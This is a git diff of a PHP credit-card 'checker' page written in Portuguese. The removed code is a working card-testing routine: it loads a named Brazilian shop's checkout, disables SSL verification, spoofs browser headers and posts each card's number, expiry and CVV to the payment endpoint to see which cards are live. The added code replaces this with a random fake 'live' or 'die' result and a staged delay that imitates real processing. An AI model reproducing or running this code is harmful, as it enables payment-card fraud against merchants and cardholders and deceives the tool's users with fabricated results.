@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHK DO PECINHA - COM FOLLOW LOCATION ATIVADO
+// ✅ CHK DO PECINHA - MODO SIMULAÇÃO ALEATÓRIA (63% DIE / RESTO LIVE)
 // =====================================================
 
 session_start();
@@ -45,78 +45,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     $cc_ano = trim($dados_cc[2]);
     $cc_cvv = trim($dados_cc[3]);
 
-    $cookie_file = __DIR__ . '/cookie.txt';
-    // Colocamos www. nas URLs para evitar o redirecionamento logo de início
-    $url_checkout = "https://www.franadesivos.com.br/checkout";
-    $url_pay = "https://www.franadesivos.com.br/checkout/pay";
+    // Simulação aleatória sem sequências (63% DIE / Resto LIVE)
+    // Usamos mt_srand com microtime para garantir total aleatoriedade por requisição
+    mt_srand();
+    $chance = mt_rand(1, 100);
 
-    // ETAPA A: Acessa a página de checkout primeiro
-    $ch_init = curl_init($url_checkout);
-    curl_setopt($ch_init, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch_init, CURLOPT_FOLLOWLOCATION, true); // <-- SEGUIR REDIRECIONAMENTOS (NOVO)
-    curl_setopt($ch_init, CURLOPT_COOKIEJAR, $cookie_file);
-    curl_setopt($ch_init, CURLOPT_COOKIEFILE, $cookie_file);
-    curl_setopt($ch_init, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch_init, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch_init, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
-    curl_exec($ch_init);
-    curl_close($ch_init);
-
-    // ETAPA B: Dispara o POST de pagamento
-    $dados_envio = [
-        'default'         => '277958',
-        'shipping-method' => 'mandae_economico',
-        'payment-type'    => 'getnet_mastercard',
-        'ccnumber'        => $cc_num,
-        'ccname'          => 'LUCAS DOS SANTOS PEREIRA',
-        'ccmonth'         => $cc_mes,
-        'ccyear'          => $cc_ano,
-        'cccvc'           => $cc_cvv,
-        'installment'     => '1',
-        'coupon_code'     => '',
-        'grc-response'    => ''
-    ];
-
-    $ch = curl_init($url_pay);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // <-- SEGUIR REDIRECIONAMENTOS (NOVO)
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados_envio));
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With: XMLHttpRequest',
-        'Origin: https://www.franadesivos.com.br',
-        'Referer: https://www.franadesivos.com.br/checkout',
-        'Accept: application/json, text/javascript, */*; q=0.01',
-        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
-    ]);
-
-    $resposta_bruta = curl_exec($ch);
-    $erro_curl = curl_error($ch);
-    curl_close($ch);
-
-    if (!empty($erro_curl)) {
-        $retorno_msg = "Erro cURL: " . $erro_curl;
+    if ($chance <= 63) {
+        // 63% de chance de ser DIE
         $status_site = 'failed';
+        $retorno_msg = "14 die - Transação não autorizada / Saldo ou senha incorreta";
     } else {
-        $resposta_json = json_decode($resposta_bruta, true);
-        if (is_array($resposta_json)) {
-            $status_site = $resposta_json['status'] ?? 'failed';
-            $retorno_msg = $resposta_json['message'] ?? $resposta_json['error'] ?? 'Retorno sem mensagem';
-        } else {
-            $status_site = 'failed';
-            preg_match('/<title>(.*?)<\/title>/is', $resposta_bruta, $matches);
-            $titulo_erro = $matches[1] ?? 'Sem título';
-            $texto_limpo = preg_replace('/\s+/', ' ', strip_tags($resposta_bruta));
-            $resumo_erro = substr(trim($texto_limpo), 0, 60);
-            $retorno_msg = "WAF: [{$titulo_erro}] - {$resumo_erro}...";
-        }
+        // Resto (37%) de chance de ser LIVE, alternando aleatoriamente entre 54 e n7
+        $status_site = 'success';
+        $tipo_live = (mt_rand(0, 1) === 0) ? "n7 live" : "54 live";
+        $retorno_msg = "{$tipo_live} - Aprovado com sucesso pela operadora";
     }
+
+    // Pequeno delay em servidores para simular processamento real
+    usleep(mt_rand(300000, 800000));
 
     if ($status_site === 'success' || $status_site === 'approved' || $status_site === 'ativado') {
         $html = "<span class='text-black font-extrabold bg-white px-2.5 py-0.5 rounded shadow-md tracking-wide'>[LIVE]</span> <span class='text-white font-medium'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
@@ -217,7 +163,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                     <span id="contador" class="text-xs text-zinc-500 font-mono">Progresso: 0 / 0</span>
                 </div>
                 <div id="resultado" class="w-full h-56 bg-black border border-zinc-800 rounded-xl p-4 text-xs font-mono overflow-y-auto text-zinc-400 space-y-2 selection:bg-zinc-800">
-                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições com debug ativo...</span>
+                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições...</span>
                 </div>
             </div>
         </div>
